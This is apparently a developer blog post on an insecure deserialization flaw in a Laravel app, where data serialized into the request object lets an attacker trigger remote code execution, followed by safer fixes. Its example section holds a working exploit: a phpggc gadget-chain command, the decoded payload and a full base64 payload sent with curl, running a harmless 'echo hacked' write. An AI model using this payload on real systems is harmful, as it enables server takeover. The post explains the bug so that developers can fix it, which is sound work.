---
title: Innocent cache leading to RCE vulnerability
date: 2026-02-19
categories: [Security]
---

Recently, I encountered an interesting case of a Remote Code Execution (RCE) vulnerability that was caused by an innocent cache mechanism. We had some code that was invoked
in the middleware, before the actual endpoint was invoked. There was a need to save data somewhere that was needed in both the middleware and the actual endpoint logic.
This data had only a request lifetime, so saving it in the database or in a cache system like Redis wasn't the best approach. 

## Problem
Someone decided to use the simplest approach and save this data in the request object itself. The problem was that the request does not accept objects, 
so the data was serialized and saved as a string. 

```php
$request->request->set('some_parameter', serialize($data));
```

Perhaps this solution was even recommended by AI, because I described the problem with passing the data from middleware to the logic invoked later, 
asked GitHub Copilot to solve that problem, and the first suggestion was to serialize the data and save it as a string in the request.

The problem with this approach is that someone with malicious intent can inject this additional parameter 'some_parameter' into the application and invoke deserialization of the payload, which 
leads to a Remote Code Execution (RCE) vulnerability. The probability of such an attack is quite low, because the attacker would need to know about this specific parameter and the fact that it is deserialized, 
but it's still a critical vulnerability that should be fixed.

### Example Attack Payload

An attacker could craft a malicious serialized object that exploits Laravel's PendingBroadcast class (or similar classes with __destruct magic methods). 
Creating a working payload isn't trivial, but there is a repository [phpggc](https://github.com/ambionics/phpggc) that provides
a collection of possible payloads for various PHP libraries and frameworks. For example, a payload for Laravel could be generated using the following command:
```
./phpggc Laravel/RCE22 system 'echo "hacked" > /Users/kamilruczynski/Projects/laravel-example/project-name/hacked.txt' -b
```

It generates a base64-encoded payload. The decoded version of the payload looks like this:
```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:41:"League\CommonMark\Environment\Environment":2:{s:64:"League\CommonMark\Environment\EnvironmentextensionsInitialized";b:1;s:55:"League\CommonMark\Environment\EnvironmentlistenerData";O:38:"League\CommonMark\Util\PrioritizedList":1:{s:44:"League\CommonMark\Util\PrioritizedListlist";a:1:{i:0;a:1:{i:0;O:36:"League\CommonMark\Event\ListenerData":2:{s:43:"League\CommonMark\Event\ListenerDataevent";s:32:"\Illuminate\Broadcasting\Channel";s:46:"League\CommonMark\Event\ListenerDatalistener";O:54:"Illuminate\Support\Testing\Fakes\ChainedBatchTruthTest":1:{s:11:"*callback";s:6:"system";}}}}}}s:8:"*event";O:31:"Illuminate\Broadcasting\Channel":1:{s:4:"name";s:86:"echo "hacked" > /Users/kamilruczynski/Projects/laravel-example/project-name/hacked.txt";}}
```

The attacker would then send a request with the serialized payload directly as a POST parameter:

```bash
curl -X POST "https://vulnerable-app/endpoint" \
  --data 'some_parameter=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086NDE6IkxlYWd1ZVxDb21tb25NYXJrXEVudmlyb25tZW50XEVudmlyb25tZW50IjoyOntzOjY0OiIATGVhZ3VlXENvbW1vbk1hcmtcRW52aXJvbm1lbnRcRW52aXJvbm1lbnQAZXh0ZW5zaW9uc0luaXRpYWxpemVkIjtiOjE7czo1NToiAExlYWd1ZVxDb21tb25NYXJrXEVudmlyb25tZW50XEVudmlyb25tZW50AGxpc3RlbmVyRGF0YSI7TzozODoiTGVhZ3VlXENvbW1vbk1hcmtcVXRpbFxQcmlvcml0aXplZExpc3QiOjE6e3M6NDQ6IgBMZWFndWVcQ29tbW9uTWFya1xVdGlsXFByaW9yaXRpemVkTGlzdABsaXN0IjthOjE6e2k6MDthOjE6e2k6MDtPOjM2OiJMZWFndWVcQ29tbW9uTWFya1xFdmVudFxMaXN0ZW5lckRhdGEiOjI6e3M6NDM6IgBMZWFndWVcQ29tbW9uTWFya1xFdmVudFxMaXN0ZW5lckRhdGEAZXZlbnQiO3M6MzI6IlxJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xDaGFubmVsIjtzOjQ2OiIATGVhZ3VlXENvbW1vbk1hcmtcRXZlbnRcTGlzdGVuZXJEYXRhAGxpc3RlbmVyIjtPOjU0OiJJbGx1bWluYXRlXFN1cHBvcnRcVGVzdGluZ1xGYWtlc1xDaGFpbmVkQmF0Y2hUcnV0aFRlc3QiOjE6e3M6MTE6IgAqAGNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fX19fX19czo4OiIAKgBldmVudCI7TzozMToiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQ2hhbm5lbCI6MTp7czo0OiJuYW1lIjtzOjg2OiJlY2hvICJoYWNrZWQiID4gL1VzZXJzL2thbWlscnVjenluc2tpL1Byb2plY3RzL2xhcmF2ZWwtZXhhbXBsZS9wcm9qZWN0LW5hbWUvaGFja2VkLnR4dCI7fX0='
```

When the application calls `unserialize($request->get('some_parameter'))`, the malicious object is reconstructed and its `__destruct()` method executes the injected command.
In this case the object looks like this:
```php
return new \Illuminate\Broadcasting\PendingBroadcast(
  new \League\CommonMark\Environment\Environment(
    new \League\CommonMark\Util\PrioritizedList(
      new \League\CommonMark\Event\ListenerData(
        new \Illuminate\Support\Testing\Fakes\ChainedBatchTruthTest(
          $function
        )
      )
    )
  ),
  new \Illuminate\Broadcasting\Channel($parameter),
  );
```

In our example, $function is `system` and $parameter is `echo "hacked" > /Users/kamilruczynski/Projects/laravel-example/project-name/hacked.txt`. 
An attacker needs to find a chain of classes to be able to execute the given function with the given parameter.
## Fix

At first glance, I noticed that PHPStorm was showing a warning about using the `unserialize` method, suggesting I should add the allowed classes parameter. For a moment, 
I thought that would be enough to fix the vulnerability, but unfortunately, there is information in the php.net docs that says otherwise:

> **Warning**  
> Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.


The proper solution is to **never use `serialize()`/`unserialize()` on user-controllable data**. Instead, there are several safe alternatives:

### Option 1: Use JSON encoding

This approach requires more work to encode/decode complex data structures, but it's much safer. It's also better for maintainability because you can easily change
namespaces and class names without breaking the serialization format.

### Option 2: Use Request Attributes
Laravel's Request object has an `attributes` property specifically designed for this purpose - storing arbitrary data during the request lifecycle:

```php
$request->attributes->set('some_parameter', $data);
```

### Option 3: Use a cache service without serialization with only one instance per request lifetime
```php
// provider
$this->app->scoped(ServiceCache::class); // one instance per request
```

Inside this ServiceCache class you can simply store some data that will be reused later. 
Keep in mind the potential memory problems if you store too much data there, but if it's just a few small objects, it should be fine. Thinking about these kinds of memory issues is especially important
in worker mode when the same instance of the application is reused for multiple requests (FrankenPHP, Swoole, RoadRunner, etc.).


## Conclusion

This case demonstrates how even seemingly innocent decisions can introduce critical security vulnerabilities. If you need serialization, make sure to 
use a safe format like JSON, and never use `unserialize()` on user-controllable data.
